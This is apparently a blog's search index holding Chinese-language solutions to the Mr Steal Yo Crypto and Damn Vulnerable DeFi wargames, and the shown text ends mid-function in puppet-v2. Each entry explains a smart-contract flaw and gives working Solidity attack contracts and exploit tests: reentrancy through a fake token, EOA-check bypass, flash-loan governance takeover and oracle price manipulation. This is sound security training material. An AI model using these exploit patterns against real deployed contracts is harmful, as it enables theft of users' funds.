<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title></title>
      <link href="/2023/03/11/crypto/"/>
      <url>/2023/03/11/crypto/</url>
      
        <content type="html"><![CDATA[<h1 id="Mr-Steal-Yo-Crypto-题解"><a href="#Mr-Steal-Yo-Crypto-题解" class="headerlink" title="Mr Steal Yo Crypto 题解"></a>Mr Steal Yo Crypto 题解</h1><h2 id="1-Jpeg-Sniper"><a href="#1-Jpeg-Sniper" class="headerlink" title="1.Jpeg Sniper"></a>1.Jpeg Sniper</h2><p>Hopegs NFT 市场即将推出大肆宣传的 NFT 收藏战利品。<br>他们有一个包装合同：FlatLaunchpeg，负责处理该系列的公开销售铸币厂。<br>你的任务是绕过他们的保护措施，在一次 tx 中最大限度地铸造整个系列。  </p><p>NFT代码</p><pre><code>contract BaseLaunchpegNFT is ERC721, Ownable &#123;    using Counters for Counters.Counter;    Counters.Counter private _tokenId;    uint256 public collectionSize;    uint256 public maxBatchSize;    uint256 public salePrice; // free mint    uint256 public maxPerAddressDuringMint;    uint256 public publicSaleStartTime;    modifier isEOA() &#123;        uint256 size;        address sender = msg.sender;        assembly &#123;            size := extcodesize(sender)        &#125;        if (size &gt; 0) revert Launchpeg__Unauthorized();        _;    &#125;    constructor(        uint256 _collectionSize,        uint256 _maxBatchSize,        uint256 _maxPerAddressDuringMint    ) ERC721(&#39;BOOTY&#39;,&#39;BOOTY&#39;) &#123;        collectionSize = _collectionSize;        maxBatchSize = _maxBatchSize;        maxPerAddressDuringMint = _maxPerAddressDuringMint;        publicSaleStartTime = block.timestamp; // mint turned on this block    &#125;    /// @notice Returns the number of NFTs minted by a specific address    /// @param _owner The owner of the NFTs    /// @return numberMinted Number of NFTs minted    function numberMinted(address _owner)        public        view        returns (uint256)    &#123;        return balanceOf(_owner);    &#125;    /// @dev returns the total amount minted    function totalSupply() public view returns (uint256) &#123;        return _tokenId.current();    &#125;    /// @dev mints n number of NFTs per user    function _mintForUser(address to, uint256 quantity) internal &#123;        for (uint256 i=0; i&lt;quantity; i++) &#123;            _mint(to, _tokenId.current());            _tokenId.increment();        &#125;    &#125;    /// @dev Verifies that enough funds have been sent by the sender and refunds the extra tokens if any    /// @param _price The price paid by the sender for minting NFTs    function _refundIfOver(uint256 _price) internal &#123;        if (msg.value &lt; _price) &#123;            revert Launchpeg__NotEnoughFunds(msg.value);        &#125;        if (msg.value &gt; _price) &#123;            (bool success, ) = msg.sender.call&#123;value: msg.value - _price&#125;(&quot;&quot;);            if (!success) &#123;                revert Launchpeg__TransferFailed();            &#125;        &#125;    &#125;&#125;</code></pre><p>包装合同  </p><pre><code>// SPDX-License-Identifier: MITpragma solidity ^0.8.4;import &quot;./BaseLaunchpegNFT.sol&quot;;/// @dev hopegs NFT exchange wrapper to manage mintcontract FlatLaunchpeg is BaseLaunchpegNFT &#123;    enum Phase &#123;        NotStarted,        PublicSale    &#125;    modifier atPhase(Phase _phase) &#123;        if (currentPhase() != _phase) &#123;            revert Launchpeg__WrongPhase();        &#125;        _;    &#125;    constructor(        uint256 _collectionSize,        uint256 _maxBatchSize,        uint256 _maxPerAddressDuringMint    ) BaseLaunchpegNFT(        _collectionSize,        _maxBatchSize,        _maxPerAddressDuringMint    ) &#123;&#125;    /// @notice Mint NFTs during the public sale    /// @param _quantity Quantity of NFTs to mint    function publicSaleMint(uint256 _quantity)        external        payable        isEOA        atPhase(Phase.PublicSale)    &#123;        if (numberMinted(msg.sender) + _quantity &gt; maxPerAddressDuringMint) &#123;            revert Launchpeg__CanNotMintThisMany();        &#125;        if (totalSupply() + _quantity &gt; collectionSize) &#123;            revert Launchpeg__MaxSupplyReached();        &#125;        uint256 total = salePrice * _quantity;        _mintForUser(msg.sender, _quantity);        _refundIfOver(total);    &#125;    /// @notice Returns the current phase    /// @return phase Current phase    function currentPhase() public view returns (Phase) &#123;        if (            publicSaleStartTime == 0 ||            block.timestamp &lt; publicSaleStartTime        ) &#123;            return Phase.NotStarted;        &#125; else &#123;            return Phase.PublicSale;        &#125;    &#125;&#125;</code></pre><p>我们如果想要铸造nft，仅能通过publicSaleMint一个方法，但是一个地址最多只能铸造5个代币，改方法有isEOA检验，只有地址代码长度为零才能调用，并且我们要在一次事务中取得所有代币（69个）<br>可以想到，如果合约在构造函数中调用publicSaleMint方法，那么由于合约还未初始化完成，代码长度就为0，可以通过isEOA检验。那么我们要通过一次事务就铸造完毕，就必须将功能拆分，用子合约用于铸造，主合约要多次创建子合约  </p><pre><code>// SPDX-License-Identifier: MITpragma solidity ^0.8.4;import &quot;./FlatLaunchpeg.sol&quot;;contract minter&#123;    address NFT;    address attacker;    constructor(address _NFT,address _attacker)&#123;        NFT = _NFT;        attacker = _attacker;        mint();    &#125;    function mint() public &#123;        uint per = 5;        for(uint amount = 0;amount&lt;=60;)&#123;            new minten(NFT,attacker,per,amount);            amount = amount+5;        &#125;//此时，已经铸造了65个        new minten(NFT,attacker,4,65);//再铸造四个    &#125;&#125;contract minten&#123;    constructor(address _nft,address attacker,uint per,uint amount)&#123;        FlatLaunchpeg nft = FlatLaunchpeg(_nft);        nft.publicSaleMint(per);//铸造per个        for(uint i = 0;i&lt;per;i++)&#123;            nft.transferFrom(address(this), attacker, amount+i);//转给attacker        &#125;    &#125;&#125;</code></pre><p>测试<br>    it(“solves the challenge”, async function () {</p><pre><code>let minterFactory = await ethers.getContractFactory(&#39;minter&#39;);let minter = await minterFactory.connect(attacker).deploy(flatLaunchpeg.address,await attacker.getAddress());&#125;);</code></pre><p><img src="1.png" alt="1"></p><h2 id="safu-vault"><a href="#safu-vault" class="headerlink" title="safu-vault"></a>safu-vault</h2><p>Safu Labs刚刚发布了他们的SafuVault，这是有史以来“最安全”的收益产生金库，或者他们的Twitter帐户是这样说的。<br>他们的SafuVault预计存入USDC，并且已经从用户那里获得了10，000 USDC。<br>你知道演习，耗尽资金（至少90%）。您从 10，000 USDC 开始。</p><p>金库代币合约<br>    // SPDX-License-Identifier: MIT<br>    pragma solidity ^0.8.0;</p><pre><code>import &quot;@openzeppelin/contracts/token/ERC20/ERC20.sol&quot;;import &quot;@openzeppelin/contracts/token/ERC20/IERC20.sol&quot;;import &quot;@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol&quot;;import &quot;@openzeppelin/contracts/access/Ownable.sol&quot;;import &quot;@openzeppelin/contracts/security/ReentrancyGuard.sol&quot;;/// @dev interface for interacting with the strategyinterface IStrategy &#123;    function want() external view returns (IERC20);    function beforeDeposit() external;    function deposit() external;    function withdraw(uint256) external;    function balanceOf() external view returns (uint256);&#125;/// @dev safu yield vault with automated strategycontract SafuVault is ERC20, Ownable, ReentrancyGuard &#123;    using SafeERC20 for IERC20;    // The strategy currently in use by the vault.    IStrategy public strategy;    constructor (        IStrategy _strategy,        string memory _name,        string memory _symbol    ) ERC20 (        _name,        _symbol    ) &#123;        strategy = IStrategy(_strategy);    &#125;    /// @dev token required as input for this strategy    function want() public view returns (IERC20) &#123;        return IERC20(strategy.want());    &#125;    /// @dev calculates amount of funds available to put to work in strategy    function available() public view returns (uint256) &#123;        return want().balanceOf(address(this));    &#125;    /// @dev calculates total underlying value of tokens held by system (vault+strategy)    function balance() public view returns (uint256) &#123;        return available()+strategy.balanceOf();    &#125;    /// @dev calls deposit() with all the sender&#39;s funds    function depositAll() external &#123;        deposit(want().balanceOf(msg.sender));    &#125;    /// @dev entrypoint of funds into the system    /// @dev people deposit with this function into the vault    function deposit(uint256 _amount) public nonReentrant &#123;        strategy.beforeDeposit();        uint256 _pool = balance();        want().safeTransferFrom(msg.sender, address(this), _amount);        earn();        uint256 _after = balance();        _amount = _after - _pool; // Additional check for deflationary tokens        uint256 shares;        if (totalSupply() == 0) &#123;            shares = _amount;        &#125; else &#123;            shares = (_amount * totalSupply()) / (_pool);        &#125;        _mint(msg.sender, shares);    &#125;    /// @dev sends funds to strategy to put them to work, by calling deposit() function    function earn() public &#123;        uint256 _bal = available();        want().safeTransfer(address(strategy), _bal);        strategy.deposit();    &#125;    /// @dev helper function to call withdraw() with all sender&#39;s funds    function withdrawAll() external &#123;        withdraw(balanceOf(msg.sender));    &#125;    /// @dev allows user to withdraw specified funds    function withdraw(uint256 _shares) public &#123;        uint256 r = (balance() * _shares) / (totalSupply());        _burn(msg.sender, _shares); // will revert if _shares &gt; what user has        uint256 b = want().balanceOf(address(this)); // check vault balance        if (b &lt; r) &#123; // withdraw any extra required funds from strategy            uint256 _withdraw = r - b;            strategy.withdraw(_withdraw);            uint256 _after = want().balanceOf(address(this));            uint256 _diff = _after - b;            if (_diff &lt; _withdraw) &#123;                r = b + _diff;            &#125;        &#125;        want().safeTransfer(msg.sender, r);    &#125;    /// @dev deposit funds into the system for other user    function depositFor(        address token,         uint256 _amount,         address user    ) public &#123;        strategy.beforeDeposit();        uint256 _pool = balance();        IERC20(token).safeTransferFrom(msg.sender, address(this), _amount);        earn();        uint256 _after = balance();        _amount = _after - _pool; // Additional check for deflationary tokens        uint256 shares;        if (totalSupply() == 0) &#123;            shares = _amount;        &#125; else &#123;            shares = (_amount * totalSupply()) / (_pool);        &#125;        _mint(user, shares);    &#125;&#125;</code></pre><p>金库储存合约</p><pre><code>// SPDX-License-Identifier: MITpragma solidity ^0.8.0;import &quot;@openzeppelin/contracts/token/ERC20/IERC20.sol&quot;;import &quot;@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol&quot;;import &quot;@openzeppelin/contracts/access/Ownable.sol&quot;;import &quot;@openzeppelin/contracts/utils/Address.sol&quot;;import &quot;@openzeppelin/contracts/security/Pausable.sol&quot;;/// @dev safu yield generation strategy/// @dev this strategy takes in &#123;want&#125; &amp; generates &#123;want&#125; using its yield generator/// @dev the yield generator is abstracted away bc it&#39;s not relevant to the exploit/// @dev therefore you will see unimplemented logic for interacting w/ the generatorcontract SafuStrategy is Ownable, Pausable &#123;    using SafeERC20 for IERC20;    using Address for address;    address public want; // deposit &amp; withdrawal token    address public vault; // safu vault    mapping (address =&gt; bool) public whitelist;    modifier onlyWhitelisted() &#123;        require(whitelist[msg.sender] == true, &quot;not whitelisted&quot;);        _;    &#125;    constructor(        address _want    ) &#123;        want = _want;        whitelist[msg.sender] = true;    &#125;    /// @dev set the vault associated w/ this strategy    function setVault(address _vault) external onlyOwner &#123;        require(vault == address(0), &quot;vault set&quot;);        vault = _vault;    &#125;    /// @dev functionality for updating the whitelist    function addOrRemoveFromWhitelist(        address add,         bool isAdd    ) public onlyOwner &#123;        whitelist[add] = isAdd;    &#125;     /// @dev puts the funds to work    /// @dev called whenever someone deposits into this strategy&#39;s vault contract    function deposit() public whenNotPaused &#123;        // takes in the deposited funds &amp; puts in yield generator        // ...    &#125;    /// @dev withdraws &#123;want&#125; and sends it to the vault    /// @param _amount How much &#123;want&#125; to withdraw.    function withdraw(uint256 _amount) external &#123;        require(msg.sender == vault, &quot;not vault&quot;);        uint256 wantBal = IERC20(want).balanceOf(address(this));        if (wantBal &lt; _amount) &#123;            // withdraws funds depositied into yield generator &amp; sends back to this address            // ...            wantBal = IERC20(want).balanceOf(address(this));        &#125;        if (wantBal &gt; _amount) &#123;            wantBal = _amount;        &#125;        IERC20(want).safeTransfer(vault, wantBal);     &#125;    /// @dev handles required functionality before vault deposits to strategy    function beforeDeposit() external virtual &#123;        uint256 wantBal = IERC20(want).balanceOf(address(this));        if (wantBal &gt; 0) &#123;            deposit();            sellHarvest();        &#125;    &#125;     /// @dev runs a single instance of harvesting    function harvest() external whenNotPaused onlyWhitelisted &#123;        require(!Address.isContract(msg.sender), &quot;is contract&quot;);        sellHarvest();        deposit(); // places harvested funds back into the yield generator    &#125;    /// @dev harvests &#123;want&#125; from the yield generator    function sellHarvest() internal &#123;        // gathers all harvested funds from the yield generator &amp; converts to &#123;want&#125;        // ...    &#125;    /// @dev calculates the total underlying &#123;want&#125; held by this strategy    /// @dev takes into account funds at hand + funds allocated in yield generator    /// @dev HOWEVER yield generator is abstracted so it is ignored here (0)    function balanceOf() public view returns (uint256) &#123;        return balanceOfWant()+0; // yield generator balance is 0    &#125;    /// @dev returns balance of &#123;want&#125; in this contract    function balanceOfWant() public view returns (uint256) &#123;        return IERC20(want).balanceOf(address(this));    &#125;    /// @dev pauses strategy    function pause() public onlyOwner &#123;        _pause();    &#125;    /// @dev unpauses the strategy    function unpause() external onlyOwner &#123;        _unpause();    &#125;&#125;</code></pre><p>分析两合约的关系，用户直接与金库代币合约交互，可以向金库里存usdc，金库代币合约把转入的usdc转入金库储存合约，然后根据存钱前后两合约的余额差量为用户铸造金库代币。如果金库中usdc数目增加，那么用户存入的usdc就会产生收益。<br>我们如何削减金库的usdc？<br>观察depositFor函数，它需要调用者传入token，然后调token的safetransFrom,如果这个token的safetransFrom是我们自己实现的，相当于我们可以在depositFor过程中再次调用deposit，而如果调用deposit的amount与外部depositFor的amount相同，那么相当于我们只传入了一次usdc代币，却铸造了两次金库代币<br>因此我们只需要实现safetransfrom就可以  </p><pre><code>// SPDX-License-Identifier: MITimport &quot;@openzeppelin/contracts/token/ERC20/IERC20.sol&quot;;import &quot;@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol&quot;;pragma solidity ^0.8.0;interface vault&#123;    function depositFor(        address token,         uint256 _amount,         address user    ) external;    function depositAll() external ;    function withdrawAll() external ;&#125;contract vaultattack&#123;    address target;    address attacker;    address token;    using SafeERC20 for IERC20;    constructor(address _vault,address _attacker,address _token) public&#123;        target = _vault;        attacker = _attacker;        token = _token;    &#125;    function attack(uint amount) public&#123;        vault(target).depositFor(address(this), amount, address(this));        vault(target).withdrawAll();    &#125;    function safeTransferFrom(        address from,        address to,        uint256 value    ) external &#123;        IERC20(token).approve(to, value);        vault(target).depositAll();    &#125;    function transfer1() public&#123;        IERC20(token).transfer(attacker, IERC20(token).balanceOf(address(this)));    &#125;&#125;</code></pre><p>调用attack之后，发现一直报错“SafeERC20: low-level call failed”<br>看了好久，发现如果我的攻击合约有fallback就不会报这个错<br>推测是我函数签名出现了问题<br>仔细看了下 safeERC20<br>发现他的safeTransFrom是这样的<br>    function safeTransferFrom(<br>            IERC20 token,<br>            address from,<br>            address to,<br>            uint256 value<br>        ) internal {<br>            _callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));<br>        }</p><p>有一段注释  </p><ul><li>To use this library you can add a <code>using SafeERC20 for IERC20;</code> statement to your contract,  </li><li>which allows you to call the safe operations as <code>token.safeTransfer(...)</code>, etc.<br>这说明<br>IERC20(token).safeTransferFrom(msg.sender, address(this), _amount);<br>这句话只的是调用IERC20的safeTransferFrom成员（因为using SafeERC20 for IERC20），第一个参数是token  所以我们真正要实现的是transferFrom  </li></ul><p>改正后的攻击合约<br>    // SPDX-License-Identifier: MIT<br>    import “@openzeppelin/contracts/token/ERC20/IERC20.sol”;<br>    import “@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol”;<br>    pragma solidity ^0.8.0;<br>    interface vault{<br>        function depositFor(<br>            address token,<br>            uint256 _amount,<br>            address user<br>        ) external;<br>        function depositAll() external ;<br>        function withdrawAll() external ;</p><pre><code>&#125;contract vaultattack&#123;    address target;    address attacker;    address token;    using SafeERC20 for IERC20;    constructor(address _vault,address _attacker,address _token) public&#123;        target = _vault;        attacker = _attacker;        token = _token;    &#125;    function attack(uint amount) public&#123;        vault(target).depositFor(address(this), amount, address(this));        vault(target).withdrawAll();    &#125;    function transferFrom(        address from,        address to,        uint256 value    ) external &#123;        IERC20(token).approve(to, value);        vault(target).depositAll();    &#125;    function transfer1() public&#123;        IERC20(token).transfer(attacker, IERC20(token).balanceOf(address(this)));    &#125;&#125;</code></pre><p>测试 </p><pre><code>it(&quot;solves the challenge&quot;, async function () &#123;let VaultAttackFactory = await ethers.getContractFactory(&#39;vaultattack&#39;,attacker);let VaultAttackContract = await VaultAttackFactory.deploy(safuVault.address,attacker.getAddress(),usdc.address);await usdc.connect(attacker).transfer(VaultAttackContract.address,precision.mul(10_000));await VaultAttackContract.attack(precision.mul(await usdc.balanceOf(VaultAttackContract.address)));await VaultAttackContract.attack(precision.mul(await usdc.balanceOf(VaultAttackContract.address)));await VaultAttackContract.attack(precision.mul(await usdc.balanceOf(VaultAttackContract.address)));await VaultAttackContract.transfer1();&#125;);</code></pre><p>重入三次后 就可以削减金库的90%<br><img src="2.png" alt="2"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Damn vaulnerable Defi 题解</title>
      <link href="/2023/02/25/Damn-valurable-defi-sotion/"/>
      <url>/2023/02/25/Damn-valurable-defi-sotion/</url>
      
        <content type="html"><![CDATA[<h2 id="untoppable"><a href="#untoppable" class="headerlink" title="untoppable"></a>untoppable</h2><p>本题让我们将合约的闪贷功能阻止<br>观察闪贷过程可以发现</p><pre><code>function flashLoan(uint256 borrowAmount) external nonReentrant &#123;    require(borrowAmount &gt; 0, &quot;Must borrow at least one token&quot;);    uint256 balanceBefore = damnValuableToken.balanceOf(address(this));    require(balanceBefore &gt;= borrowAmount, &quot;Not enough tokens in pool&quot;);    // Ensured by the protocol via the `depositTokens` function    assert(poolBalance == balanceBefore);    damnValuableToken.transfer(msg.sender, borrowAmount);    IReceiver(msg.sender).receiveTokens(address(damnValuableToken), borrowAmount);    uint256 balanceAfter = damnValuableToken.balanceOf(address(this));    require(balanceAfter &gt;= balanceBefore, &quot;Flash loan hasn&#39;t been paid back&quot;);&#125;</code></pre><p>其中要求assert(poolBalance == balanceBefore);<br>poolBalance增加是通过depositToken函数<br>而damnValuableToken还有transfer函数可以将代币转入贷款池<br>所以只需要向贷款池转入任意数量的代币 此条件就不成立 闪贷过程就会被assert  </p><pre><code>await this.token.transfer(this.pool.address,INITIAL_ATTACKER_TOKEN_BALANCE);</code></pre><hr><h2 id="naive-receiver"><a href="#naive-receiver" class="headerlink" title="naive-receiver"></a>naive-receiver</h2><p>这次的闪贷一次要多花1 ether的费用 题目要求我们耗费完接受者合约的ether<br>观察闪贷过程 闪贷未对borrower 进行检测 所以我们可以任意让拥有配套receiveEther函数的别的合约调用flashloan<br>因此 调用十次flashloan borrwoer填接收器合约地址 就可以完成本题目</p><pre><code>it(&#39;Exploit&#39;, async function () &#123;    for (i=0;i&lt;10;i++)&#123;        this.pool.flashLoan(this.receiver.address,ethers.utils.parseEther(ETHER_IN_POOL));    &#125;&#125;);</code></pre><hr><h2 id="Truster"><a href="#Truster" class="headerlink" title="Truster"></a>Truster</h2><p>题目要求取走闪贷合约的ETH<br>观察闪贷过程  </p><pre><code>function flashLoan(    uint256 borrowAmount,    address borrower,    address target,    bytes calldata data)    external    nonReentrant&#123;    uint256 balanceBefore = damnValuableToken.balanceOf(address(this));    require(balanceBefore &gt;= borrowAmount, &quot;Not enough tokens in pool&quot;);    damnValuableToken.transfer(borrower, borrowAmount);    target.functionCall(data);    uint256 balanceAfter = damnValuableToken.balanceOf(address(this));    require(balanceAfter &gt;= balanceBefore, &quot;Flash loan hasn&#39;t been paid back&quot;);&#125;</code></pre><p>它允许以本合约调用任意合约的任意函数<br>如果我们用它来调用damnValunableToken的approve函数  那我们的合约就有了转走pool里eth的权限</p><pre><code>// SPDX-License-Identifier: MITpragma solidity ^0.8.0;import &#39;contracts/DamnValuableToken.sol&#39;;import &#39;./TrusterLenderPool.sol&#39;;contract trusterAttack&#123;    TrusterLenderPool pool;    DamnValuableToken token;    constructor(address add1,address add2) public&#123;        pool = TrusterLenderPool(add1);        token = DamnValuableToken(add2);    &#125;    function doFlashLoan(uint256 Amount,address borrower,address target,address attacker) public&#123;        bytes memory data = abi.encodeWithSignature(&quot;approve(address,uint256)&quot;,address(this) ,Amount);        pool.flashLoan(0, borrower, target, data);        token.transferFrom(address(pool) , attacker , Amount);    &#125;&#125; it(&#39;Exploit&#39;, async function () &#123;    /** CODE YOUR EXPLOIT HERE  */    const TrusterAttack = await ethers.getContractFactory(&#39;trusterAttack&#39;,attacker);    this.AttackContract = await TrusterAttack.deploy(this.pool.address, this.token.address);    this.AttackContract.doFlashLoan(TOKENS_IN_POOL,this.AttackContract.address,this.token.address,attacker.address);&#125;)</code></pre><hr><h2 id="side-entrance"><a href="#side-entrance" class="headerlink" title="side-entrance"></a>side-entrance</h2><p>题目要求：取走闪贷合约的所有ETH<br>观察合约，闪贷接受方需要实现IFlashLoanEtherReceiver<br>合约中还有deposit 和 withdraw两个函数对应存钱取钱<br>所以如果用闪贷的钱进行deposit，闪贷可以完成并且余额可以增加<br>闪贷结束后再withdraw就可以完成</p><pre><code>pragma solidity ^0.8.0;import &quot;./SideEntranceLenderPool.sol&quot;;contract sideAttack&#123;    SideEntranceLenderPool pool;    uint amount;    constructor(address add,uint num) public &#123;        pool = SideEntranceLenderPool(add);        amount = num;    &#125;    function doFlashloan(uint amount,address addr) public payable&#123;        pool.flashLoan(amount);        pool.withdraw();        selfdestruct(payable(addr));//把钱转给attacker    &#125;    function execute() external payable&#123;        address(pool).call&#123;value: amount&#125;(abi.encodeWithSignature(&quot;deposit()&quot;));    &#125;    receive() external payable&#123;&#125;&#125;    it(&#39;Exploit&#39;, async function () &#123;    /** CODE YOUR EXPLOIT HERE */    const SideEntraceAttackFactory = await ethers.getContractFactory(&#39;sideAttack&#39;,attacker);    this.attackContract = await SideEntraceAttackFactory.deploy(this.pool.address,ETHER_IN_POOL);    this.attackContract.doFlashloan(ETHER_IN_POOL,attacker.address);&#125;);</code></pre><hr><h2 id="the-rewarder"><a href="#the-rewarder" class="headerlink" title="the rewarder"></a>the rewarder</h2><p>在theRewarderPool中，可以观察到如果我们向合约中转入liqToken 合约会为我们铸造accToken 然后按照我们账户accToken 占上一次totalSupply的比重铸造rewardToken（要求每回合只能铸造一次，5天一个回合）<br>其实题目已经提示的很清楚了 通过闪贷贷出大量liqToken 进行deposit，由于liqToken数量很大，所以我们能获得很多rewardToken  </p><pre><code>import &quot;./TheRewarderPool.sol&quot;;import &quot;./FlashLoanerPool.sol&quot;;import &quot;contracts/DamnValuableToken.sol&quot;;import &quot;./RewardToken.sol&quot;;pragma solidity ^0.8.0;contract rewardAttack&#123;    FlashLoanerPool pool;    DamnValuableToken liqToken;    TheRewarderPool rewardpool;    RewardToken token;    constructor(address add1,address add2,address add3,address add4) public &#123;        pool = FlashLoanerPool(add1);        liqToken = DamnValuableToken(add2);        rewardpool = TheRewarderPool(add3);        token = RewardToken(add4);    &#125;    function attack(uint amount) public&#123;        pool.flashLoan(amount);    &#125;    function receiveFlashLoan(uint256 amount) external&#123;        liqToken.approve(address(rewardpool), amount);        rewardpool.deposit(amount);        rewardpool.withdraw(amount);        liqToken.transfer(address(pool), amount);    &#125;    function transfer(address add,uint amount) public&#123;        token.transfer(add, amount);//最后把rewardToken转给attacker以通过验证    &#125;&#125;it(&#39;Exploit&#39;, async function () &#123;    /** CODE YOUR EXPLOIT HERE */    await ethers.provider.send(&quot;evm_increaseTime&quot;, [5 * 24 * 60 * 60]);//由于题目需求进入第三回合 所以我们必须先等5天再进行deposit才能触发_recordSnapshot()进入第三回合    const RewardAttackFactory = await ethers.getContractFactory(&#39;rewardAttack&#39;,attacker);    this.attackContract = await RewardAttackFactory.deploy( this.flashLoanPool.address,this.liquidityToken.address,this.rewarderPool.address,this.rewardToken.address);    await this.attackContract.attack(TOKENS_IN_LENDER_POOL);    let amount = this.rewardToken.balanceOf(this.attackContract.address);    await this.attackContract.transfer(attacker.address,amount);&#125;);</code></pre><h2 id="selfie"><a href="#selfie" class="headerlink" title="selfie"></a>selfie</h2><p>题目要求我们取走贷款池中的所有代币<br>观察贷款合约 drainAllFunds函数可以将贷款池中的所有代币转移给指定地址 预计要用到这个函数完成目标<br>drainAllFunds函数只有governance可以触发<br>观察governance合约 当我们的代币余额大于总供应的一半时，我们可以请求governance合约去完成一些调用<br>这个调用过程是先通过queueAction函数进行调用请求 然后等待ACTION_DELAY_IN_SECONDS也就是两天之后可以通过executeAction函数执行调用<br>在执行调用的过程中没有进行代币余额的检查<br>所以可以想到闪贷贷出池中的所有货币，对governance合约进行 向贷款池调用drainAllFunds 的调用请求，之后把钱还回去<br>等待两天之后执行调用 我们就可以获得贷款池中的所有代币  </p><pre><code>import &quot;./SelfiePool.sol&quot;;import &quot;./SimpleGovernance.sol&quot;;import &quot;../DamnValuableTokenSnapshot.sol&quot;;pragma solidity ^0.8.0;contract selfieAttack&#123;    SelfiePool pool;    SimpleGovernance governance;    address attacker;    constructor(address add1,address add2,address add4) public &#123;        pool = SelfiePool(add1);        governance = SimpleGovernance(add2);        attacker = add4;    &#125;    function FlashLoan(uint amount) public&#123;        pool.flashLoan(amount);    &#125;    function receiveTokens(address add,uint256 amount) external&#123;        add.call(abi.encodeWithSignature(&quot;snapshot()&quot;));        bytes memory data = abi.encodeWithSignature(&quot;drainAllFunds(address)&quot;,attacker);        governance.queueAction(address(pool),data,0);        (bool success,) = add.call(abi.encodeWithSignature(&quot;transfer(address,uint256)&quot;,address(pool),amount));        require(success,&quot;call failed&quot;);    &#125;    function doAction(uint Id) public &#123;        governance.executeAction(Id);    &#125;&#125;it(&#39;Exploit&#39;, async function () &#123;    /** CODE YOUR EXPLOIT HERE */    const SelfieAttackFactory = await ethers.getContractFactory(&quot;selfieAttack&quot;,attacker);    this.AttackContract = await SelfieAttackFactory.deploy(this.pool.address,this.governance.address,attacker.address);    await this.AttackContract.FlashLoan(TOKENS_IN_POOL);    await ethers.provider.send(&quot;evm_increaseTime&quot;,[2 * 24 * 60 * 60]);    await this.AttackContract.doAction(1);    &#125;);</code></pre><h2 id="puppet"><a href="#puppet" class="headerlink" title="puppet"></a>puppet</h2><p>题目要求：转走贷款池中的所有代币<br>观察贷款池</p><pre><code>function borrow(uint256 borrowAmount) public payable nonReentrant &#123;    uint256 depositRequired = calculateDepositRequired(borrowAmount);    require(msg.value &gt;= depositRequired, &quot;Not depositing enough collateral&quot;);    if (msg.value &gt; depositRequired) &#123;        payable(msg.sender).sendValue(msg.value - depositRequired);    &#125;    deposits[msg.sender] = deposits[msg.sender] + depositRequired;    // Fails if the pool doesn&#39;t have enough tokens in liquidity    require(token.transfer(msg.sender, borrowAmount), &quot;Transfer failed&quot;);    emit Borrowed(msg.sender, depositRequired, borrowAmount);&#125;function calculateDepositRequired(uint256 amount) public view returns (uint256) &#123;    return amount * _computeOraclePrice() * 2 / 10 ** 18;&#125;function _computeOraclePrice() private view returns (uint256) &#123;    // calculates the price of the token in wei according to Uniswap pair    return uniswapPair.balance * (10 ** 18) / token.balanceOf(uniswapPair);&#125;</code></pre><p>发现如果想要借走代币，需要抵押相应的ETH，价格与uniswapPair中的ETH和代币储存量有关，如果uniswapPair中代币变多，那么价格就会降低<br>uniswapPair从10 ETH 10 DVTt 开始<br>我们有1000 DVT 和25ETH  </p><pre><code>function tokenToEthOutput(uint256 eth_bought, uint256 max_tokens, uint256 deadline, address buyer, address payable recipient) private returns (uint256) &#123;require(deadline &gt;= block.timestamp &amp;&amp; eth_bought &gt; 0);uint256 token_reserve = token.balanceOf(address(this));uint256 tokens_sold = getOutputPrice(eth_bought, token_reserve, address(this).balance);// tokens sold is always &gt; 0require(max_tokens &gt;= tokens_sold);recipient.transfer(eth_bought);require(token.transferFrom(buyer, address(this), tokens_sold));emit EthPurchase(buyer, tokens_sold, eth_bought);return tokens_sold;</code></pre><p>  }</p><p>  function tokenToEthSwapOutput(uint256 eth_bought, uint256 max_tokens, uint256 deadline) public returns (uint256) {<br>    return tokenToEthOutput(eth_bought, max_tokens, deadline, msg.sender, msg.sender);<br>  }  </p><p>调用uniswapPair的tokenToETHSwapOutput可以将代币换为ETH<br>因此我们存入向uniswapPair自己的代币换出ETH，这样pool中的代币价格就变低了 我们就可以borrow了</p><pre><code>it(&#39;Exploit&#39;, async function () &#123;    const deadline = (await ethers.provider.getBlock(&#39;latest&#39;)).timestamp * 2    await this.token.connect(attacker).approve(this.uniswapExchange.address,ATTACKER_INITIAL_TOKEN_BALANCE);    const AMOUNT = await ethers.utils.parseEther(&quot;900&quot;)    await this.uniswapExchange.connect(attacker).tokenToEthSwapInput(AMOUNT ,1, deadline);    const value = await this.lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE);    await this.lendingPool.connect(attacker).borrow(POOL_INITIAL_TOKEN_BALANCE,&#123;value:value&#125;);&#125;);</code></pre><p><strong>还应该特别注意两点：</strong><br>每个交易都应由attacker发出<br>不能全把自己的token转入<br>因为验证条件需要attacker的代币余额大于POOL_INITIAL_TOKEN_BALANCE</p><h2 id="puppet-v2"><a href="#puppet-v2" class="headerlink" title="puppet-v2"></a>puppet-v2</h2><p>和上一题相比，抵押物成了WETH，也更新了计算价格的方法  </p><pre><code>function calculateDepositOfWETHRequired(uint256 tokenAmount) public view returns (uint256) &#123;    return _getOracleQuote(tokenAmount).mul(3) / (10 ** 18);&#125;// Fetch the price from Uniswap v2 using the official librariesfunction _getOracleQuote(uint256 amount) private view returns (uint256) &#123;    (uint256 reservesWETH, uint256 reservesToken) = UniswapV2Library.getReserves(        _uniswapFactory, address(_weth), address(_token)    );    return UniswapV2Library.quote(amount.mul(10 ** 18), reservesToken, reservesWETH);&#125;</code></pre><p>价格为amount<em>reverseWETH</em>3/reverseToken<br>所以uniswapv2中weth越少，token越多 价格越低<br>uniswapv2可以用swap对两种代币进行交换，所以我们把自己的token换为weth就可以完成题目  </p><pre><code>// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract puppetv2Attack&#123;    address pool;    address token;    address weth;    constructor(address add1,address add2,address add3) public&#123;        pool = add1;        token = add2;        weth = add3;    &#125;    function giveToken(bytes memory data2)public &#123;        (bool success,) = weth.call(data2);        require(success,&quot;call 2 failed&quot;);    &#125;    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) public pure returns 